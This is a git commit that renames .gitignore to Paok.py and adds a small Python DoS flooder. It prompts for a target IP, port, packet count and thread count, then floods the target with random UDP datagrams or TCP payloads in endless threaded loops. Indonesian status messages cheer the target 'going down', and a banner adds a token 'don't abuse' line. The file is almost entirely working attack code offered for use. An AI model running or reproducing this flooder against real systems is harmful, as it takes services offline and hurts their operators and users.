5f5efe2430ce563477d3f9c887992528c5eb0761
UFTTT <92656900+UFTTT@users.noreply.github.com>
2021-10-17 10:42:59 +0700

    Update and rename .gitignore to Paok.py

---
+++ Paok.py
@@ -0,0 +1,56 @@
+import random
+import socket
+import threading
+print("""
+
+██╗░░░██╗███████╗████████╗████████╗████████╗
+██║░░░██║██╔════╝╚══██╔══╝╚══██╔══╝╚══██╔══╝
+██║░░░██║█████╗░░░░░██║░░░░░░██║░░░░░░██║░░░
+██║░░░██║██╔══╝░░░░░██║░░░░░░██║░░░░░░██║░░░
+╚██████╔╝██║░░░░░░░░██║░░░░░░██║░░░░░░██║░░░
+░╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░ """)
+print("UFTTT NIH BOSS")
+print("RAMEKE BY UFTT,Xlabador,ndagog")
+print("GUNAKAN TOOLS INI JANGAN ABUSE")
+
+ip = str(input(" IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" Y ORE N(y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1025)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" BENTAR LAGI DOWN YA!!!")
+		except:
+			print("[!] MAMPUS DOWN!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" BENTAR LAGI DOWN YA!!!")
+		except:
+			s.close()
+			print("[*] MAMPUS DOWN!!!")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
+© 2021 GitHub, Inc.
